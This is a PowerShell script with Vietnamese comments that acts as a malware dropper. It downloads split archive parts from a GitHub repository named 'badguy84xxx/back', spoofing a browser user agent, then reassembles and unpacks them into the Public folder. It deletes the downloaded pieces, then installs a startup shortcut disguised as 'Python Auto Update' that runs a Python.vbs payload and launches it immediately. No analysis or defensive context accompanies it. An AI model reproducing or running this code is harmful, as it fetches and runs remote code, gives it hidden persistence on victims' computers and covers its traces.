$urls = @(
    "https://github.com/badguy84xxx/back/raw/refs/heads/main/Backup.zip.001",
    "https://github.com/badguy84xxx/back/raw/refs/heads/main/Backup.zip.002",
    "https://github.com/badguy84xxx/back/raw/refs/heads/main/Backup.zip.003"
)
$publicDir = "$env:Public"
$outputDir = Join-Path -Path $publicDir -ChildPath "Python"
$downloadedFiles = @()
$outputFile = Join-Path -Path $publicDir -ChildPath "Backup.zip"

# Tạo thư mục đích nếu chưa tồn tại
if (!(Test-Path -Path $outputDir)) {
    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
}

# Tải xuống tất cả các tệp
foreach ($url in $urls) {
    # Tên tệp từ URL
    $fileName = [System.IO.Path]::GetFileName($url)
    $filePath = Join-Path -Path $publicDir -ChildPath $fileName

    # Tải xuống tệp
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    try {
        $webClient.DownloadFile($url, $filePath)
        Write-Output "Tải xuống thành công: $filePath"
        $downloadedFiles += $filePath # Ghi nhận tệp đã tải xuống
    } catch {
        Write-Output "Lỗi khi tải xuống: $url"
        Write-Output "Chi tiết lỗi: $_"
        continue
    }
}

# Ghép các tệp .001, .002, .003 thành Backup.zip
try {
    Get-Content -Path ($downloadedFiles | Sort-Object) -Encoding Byte -ReadCount 0 |
        Set-Content -Path $outputFile -Encoding Byte
    Write-Output "Ghép tệp thành công: $outputFile"
} catch {
    Write-Output "Lỗi trong quá trình ghép tệp: $_"
    exit
}

# Giải nén tệp ZIP
if (Test-Path -Path $outputFile) {
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($outputFile, $outputDir)
        Write-Output "Giải nén hoàn tất: $outputFile vào $outputDir"

        # Xóa tệp ZIP và các tệp nhỏ đã tải xuống
        Remove-Item -Path $outputFile -Force
        Write-Output "Đã xóa tệp ZIP: $outputFile"

        foreach ($file in $downloadedFiles) {
            Remove-Item -Path $file -Force
            Write-Output "Đã xóa tệp nhỏ: $file"
        }
    } catch {
        Write-Output "Lỗi trong quá trình giải nén: $_"
    }
} else {
    Write-Output "Tệp ZIP không tồn tại hoặc ghép không thành công: $outputFile"
}

# Tạo Shortcut của Python.vbs trong thư mục Startup
$TargetFile = "C:\Users\Public\Python\Python.vbs"
$ShortcutName = "Python Auto Update.lnk"
$StartupFolder = "$([Environment]::GetFolderPath('Startup'))"
$ShortcutPath = Join-Path -Path $StartupFolder -ChildPath $ShortcutName

try {
    # Tạo đối tượng WScript.Shell
    $Shell = New-Object -ComObject WScript.Shell

    # Tạo Shortcut
    $Shortcut = $Shell.CreateShortcut($ShortcutPath)
    $Shortcut.TargetPath = $TargetFile
    $Shortcut.WorkingDirectory = (Split-Path -Path $TargetFile)
    $Shortcut.Save()

    Write-Host "Shortcut created at $ShortcutPath"

    # Thực thi Shortcut
    Start-Process -FilePath $ShortcutPath
    Write-Output "Đã thực thi Shortcut: $ShortcutPath"
} catch {
    Write-Output "Lỗi khi tạo hoặc thực thi Shortcut: $_"
}
